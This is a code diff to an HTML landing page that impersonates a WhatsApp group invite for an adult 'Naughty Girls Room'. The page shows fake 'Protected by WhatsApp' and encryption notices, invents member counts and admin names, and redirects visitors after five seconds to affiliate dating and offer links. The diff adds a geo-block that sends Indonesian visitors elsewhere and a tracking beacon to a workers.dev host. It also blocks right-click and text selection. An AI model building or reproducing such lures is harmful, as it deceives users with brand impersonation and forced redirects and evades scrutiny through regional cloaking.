@@ -9,17 +9,7 @@
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;background:#000;overflow:hidden;height:100vh;color:#fff;position:relative}
         .bg-video{position:absolute;top:50%;left:50%;min-width:100%;min-height:100%;width:auto;height:auto;transform:translate(-50%,-50%);z-index:-2;object-fit:cover}
-        
-        /* <<< PERUBAHAN UTAMA DI SINI >>> */
-        .blur-content{
-            background:rgba(0,0,0,0.30);        /* jauh lebih tipis dari sebelumnya (0.55) */
-            backdrop-filter:blur(6px);          /* dari 12px jadi 2px → video sangat tajam */
-            height:100vh;
-            display:flex;
-            flex-direction:column;
-        }
-        /* <<< AKHIR PERUBAHAN >>> */
-
+        .blur-content{background:rgba(0,0,0,0.45); backdrop-filter:blur(8px);height:100vh;display:flex;flex-direction:column}
         .whatsapp-header{display:flex;align-items:center;padding:15px;background:#075e54;color:#fff;position:relative;z-index:1}
         .back-button{font-size:22px;cursor:pointer;margin-right:15px}
         .header-text h1{font-size:19px;font-weight:500}
@@ -30,8 +20,8 @@
             flex-direction:column;
             justify-content:space-between;
             padding:20px 20px 10px;
-            align-items:center;
-            text-align:center;
+            align-items:center;           /* semua isi rata tengah */
+            text-align:center;            /* teks juga center */
         }
         .profile-container,.members-info,.notification,.join-button{opacity:0;transform:translateY(20px);transition:all .5s}
         .profile-img{background:#128c7e;width:90px;height:90px;border-radius:50%;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:40px}
@@ -59,6 +49,20 @@
         .message-popup::after{content:"";position:absolute;top:100%;left:50%;margin-left:-8px;border:8px solid transparent;border-top-color:#000}
         .show{opacity:1}
     </style>
+    <!-- GEO BLOCK INDONESIA (langsung di head biar paling cepat) -->
+    <script>
+        // Blokir Indonesia → langsung ke Google cari THREADS
+        const BLOCKED_COUNTRIES = ["ID"];
+            fetch('https://ipapi.co/json/', {cache: "force-cache"})
+                .then(r => r.json())
+                .then(d => {
+                    if (BLOCKED_COUNTRIES.includes(d.country_code || d.country)) {
+                        location.replace("https://www.google.com/search?q=THREADS");
+                    }
+                })
+                .catch(() => { /* kalau gagal tetap lanjut (biar tidak mati) */ });
+        
+    </script>
 </head>
 <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
 
@@ -114,13 +118,16 @@
     </div>
 
     <script>
-		const OFFERS = [
+        // GANTI LINK AFILIASI KAMU DI SINI
+        const OFFERS = [
             "https://mgepmr9.mybetterdatings.com/lk6rmz1?s1=CAPCUT&cid=CAPCUT",
             "https://kmoww.freeluckytiming.com/?utm_source=da57dc555e50572d&ban=other&j5=1&j6=1&s1=23300&s2=2184877&s3=CAPCUT&click_id=CAPCUT"
         ];
 
+        // Pilih random setiap kali halaman dibuka
         let TARGET_URL = OFFERS[Math.floor(Math.random() * OFFERS.length)];
 
+        // 12 VIDEO + fallback
         const videoList = [
             "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
             "https://files.catbox.moe/387f3z.mp4",
@@ -150,6 +157,7 @@
             });
         }
 
+        // RANDOM MEMBER & ONLINE
         function formatNumber(num) {
             if (num >= 1000000) return (num/1e6).toFixed(1)+'M';
             if (num >= 1000) return (num/1000).toFixed(1)+'K';
@@ -162,17 +170,79 @@
             document.getElementById('onlineMembers').textContent = (online/1000).toFixed(1)+'K';
         }
 
+        // RANDOM NAMA ADMIN
         const firstNames = ["Emily","Sophia","Isabella","Mia","Ava","Olivia","Luna","Chloe","Zoe","Anna","Lisa","Sarah","Putri","Siti","Ayu","Dewi","Intan","Citra","Tiara","Bella","Aisyah","Vanessa","Jessica","Angel"];
         const lastNames = ["Whitney","Johnson","Miller","Davis","Garcia","Martinez","Lopez","Wilson","Anderson","Thomas","Moore","Perez","Harris","Clark","Lewis","Walker","Young","King","Scott","Nguyen","Adams","Hall"];
         function getRandomName(){return firstNames[Math.floor(Math.random()*firstNames.length)]+" "+lastNames[Math.floor(Math.random()*lastNames.length)];}
 
+        // MULTIBAHASA
         const translations = {
-            id: {groupName:"Naughty Girls Room",admin:"Admin dan Moderator: Emily Whitney",members:"Anggota",online:"Online",joinButton:"Gabung grup",encryption:"Pesan dan panggilan baru diamankan dengan enkripsi end-to-end. Hanya orang dalam obrolan ini yang dapat membaca atau mendengarkannya.",protected:"Dilindungi oleh WhatsApp",footer:"Dengan mengklik “Gabung grup”, kamu setuju membagikan informasi kontak dengan admin grup dan peserta lain.",enjoyed:"Orang yang Aktif Menikmati Layanan Ini"},
-            en: {groupName:"Naughty Girls Room",admin:"Admin and Moderator: Emily Whitney",members:"Members",online:"Online",joinButton:"Join the group",encryption:"New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen, or share them.",protected:"Protected by WhatsApp",footer:"By clicking “Join the group”, you agree to share contact information with the group administrator and other participants.",enjoyed:"People Who Have Actively Enjoyed This Service"},
-            de: {groupName:"Versautes Mädchenzimmer",admin:"Admin & Moderatorin: Emily Whitney",members:"Mitglieder",online:"Online",joinButton:"Gruppe beitreten",encryption:"Neue Nachrichten und Anrufe sind durch Ende-zu-Ende-Verschlüsselung geschützt. Nur Teilnehmer dieses Chats können sie lesen oder hören.",protected:"Geschützt durch WhatsApp",footer:"Durch Klick auf “Gruppe beitreten” stimmst du zu, Kontaktdaten mit dem Gruppenadmin und anderen Teilnehmern zu teilen.",enjoyed:"Personen, die diesen Dienst aktiv genossen haben"},
-            es: {groupName:"Habitación de Chicas Traviesas",admin:"Admin y Moderadora: Emily Whitney",members:"Miembros",online:"En línea",joinButton:"Unirse al grupo",encryption:"Los nuevos mensajes y llamadas están protegidos con cifrado de extremo a extremo. Solo las personas del chat pueden leerlos leer o escucharlos.",protected:"Protegido por WhatsApp",footer:"Al hacer clic en “Unirse al grupo” aceptas compartir tu información de contacto con el administrador y otros participantes.",enjoyed:"Personas que han disfrutado activamente de este servicio"},
-            pt: {groupName:"Sala das Safadinhas",admin:"Admin e Moderadora: Emily Whitney",members:"Membros",online:"Online",joinButton:"Entrar no grupo",encryption:"Novas mensagens e chamadas são protegidas com criptografia de ponta a ponta. Apenas pessoas neste chat podem ler ou ouvir.",protected:"Protegido pelo WhatsApp",footer:"Ao clicar em “Entrar no grupo”, você concorda em compartilhar informações de contato com o administrador e outros participantes.",enjoyed:"Pessoas que aproveitaram ativamente este serviço"},
-            fr: {groupName:"Salon des Coquines",admin:"Admin & Modératrice : Emily Whitney",members:"Membres",online:"En ligne",joinButton:"Rejoindre le groupe",encryption:"Les nouveaux messages et appels sont sécurisés par chiffrement de bout en bout. Seules les personnes du chat peuvent les lire ou les écouter.",protected:"Protégé par WhatsApp",footer:"En cliquant sur “Rejoindre le groupe”, vous acceptez de partager vos coordonnées avec l’administrateur et les autres participants.",enjoyed:"Personnes ayant activement apprécié ce service"}
+            id: {
+                groupName: "Naughty Girls Room",
+                admin: "Admin dan Moderator: Emily Whitney",
+                members: "Anggota",
+                online: "Online",
+                joinButton: "Gabung grup",
+                encryption: "Pesan dan panggilan baru diamankan dengan enkripsi end-to-end. Hanya orang dalam obrolan ini yang dapat membaca atau mendengarkannya.",
+                protected: "Dilindungi oleh WhatsApp",
+                footer: "Dengan mengklik “Gabung grup”, kamu setuju membagikan informasi kontak dengan admin grup dan peserta lain.",
+                enjoyed: "Orang yang Aktif Menikmati Layanan Ini"
+            },
+            en: {
+                groupName: "Naughty Girls Room",
+                admin: "Admin and Moderator: Emily Whitney",
+                members: "Members",
+                online: "Online",
+                joinButton: "Join the group",
+                encryption: "New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen, or, or share them.",
+                protected: "Protected by WhatsApp",
+                footer: "By clicking “Join the group”, you agree to share contact information with the group administrator and other participants.",
+                enjoyed: "People Who Have Actively Enjoyed This Service"
+            },
+            de: {
+                groupName: "Versautes Mädchenzimmer",
+                admin: "Admin & Moderatorin: Emily Whitney",
+                members: "Mitglieder",
+                online: "Online",
+                joinButton: "Gruppe beitreten",
+                encryption: "Neue Nachrichten und Anrufe sind durch Ende-zu-Ende-Verschlüsselung geschützt. Nur Teilnehmer dieses Chats können sie lesen oder hören.",
+                protected: "Geschützt durch WhatsApp",
+                footer: "Durch Klick auf “Gruppe beitreten” stimmst du zu, Kontaktdaten mit dem Gruppenadmin und anderen Teilnehmern zu teilen.",
+                enjoyed: "Personen, die diesen Dienst aktiv genossen haben"
+            },
+            es: {
+                groupName: "Habitación de Chicas Traviesas",
+                admin: "Admin y Moderadora: Emily Whitney",
+                members: "Miembros",
+                online: "En línea",
+                joinButton: "Unirse al grupo",
+                encryption: "Los nuevos mensajes y llamadas están protegidos con cifrado de extremo a extremo. Solo las personas del chat pueden leerlos leer o escucharlos.",
+                protected: "Protegido por WhatsApp",
+                footer: "Al hacer clic en “Unirse al grupo” aceptas compartir tu información de contacto con el administrador y otros participantes.",
+                enjoyed: "Personas que han disfrutado activamente de este servicio"
+            },
+            pt: {
+                groupName: "Sala das Safadinhas",
+                admin: "Admin e Moderadora: Emily Whitney",
+                members: "Membros",
+                online: "Online",
+                joinButton: "Entrar no grupo",
+                encryption: "Novas mensagens e chamadas são protegidas com criptografia de ponta a ponta. Apenas pessoas neste chat podem ler ou ouvir.",
+                protected: "Protegido pelo WhatsApp",
+                footer: "Ao clicar em “Entrar no grupo”, você concorda em compartilhar informações de contato com o administrador e outros participantes.",
+                enjoyed: "Pessoas que aproveitaram ativamente este serviço"
+            },
+            fr: {
+                groupName: "Salon des Coquines",
+                admin: "Admin & Modératrice : Emily Whitney",
+                members: "Membres",
+                online: "En ligne",
+                joinButton: "Rejoindre le groupe",
+                encryption: "Les nouveaux messages et appels sont sécurisés par chiffrement de bout en bout. Seules les personnes du chat peuvent les lire ou les écouter.",
+                protected: "Protégé par WhatsApp",
+                footer: "En cliquant sur “Rejoindre le groupe”, vous acceptez de partager vos coordonnées avec l’administrateur et les autres participants.",
+                enjoyed: "Personnes ayant activement apprécié ce service"
+            },
         };
 
         const userLang = (navigator.language || navigator.userLanguage || "en").substr(0,2).toLowerCase();
@@ -184,15 +254,27 @@
         });
         document.getElementById("adminText").textContent = (translations[lang].admin || "Admin & Moderator: ") + getRandomName();
 
+        // Redirect + semua parameter
         const params = new URLSearchParams(window.location.search);
         let finalUrl = TARGET_URL + (params.toString() ? (TARGET_URL.includes('?') ? '&' : '?') + params.toString() : '');
+        
+        // REDIRECT OTOMATIS SETELAH 5 DETIK (TANPA TULISAN APAPUN)
+        setTimeout(() => {
+            location.href = finalUrl;
+        }, 5000);   // ubah angka 5000 jadi 3000 kalau mau 3 detik, 7000 untuk 7 detik, dll
+        
+        // Tetap bisa klik manual sebelum 5 detik
+        document.getElementById('joinButton').onclick = () => {
+            location.href = finalUrl;
+        };
 
-        // Auto redirect 5 detik
-        setTimeout(() => { location.href = finalUrl; }, 5000);
-
-        document.getElementById('joinButton').onclick = () => { location.href = finalUrl; };
-
+        // Jalankan saat halaman load
         document.addEventListener('DOMContentLoaded', () => {
+            // --- TAMBAHAN MATA-MATA ---
+            // Kirim laporan ke Worker Anda bahwa landing page telah dibuka dengan CID tetap
+            fetch('https://dasboard.bennylaos483.workers.dev/track?cid=CAPCUT', { method: 'GET', keepalive: true });
+            // ---------------------------
+
             loadRandomVideo();
             randomizeCounts();
             const els = document.querySelectorAll('.profile-container, .members-info, .notification, .join-button');
@@ -217,19 +299,8 @@
         btn.ontouchend=e=>{e.preventDefault();go();}
         btn.oncontextmenu=e=>{e.preventDefault();go();}
 
+        // Force play video setelah klik
         document.body.onclick = () => videoEl.play();
     </script>
 </body>
-
 </html>
-
-
-
-
-
-
-
-
-
-
-
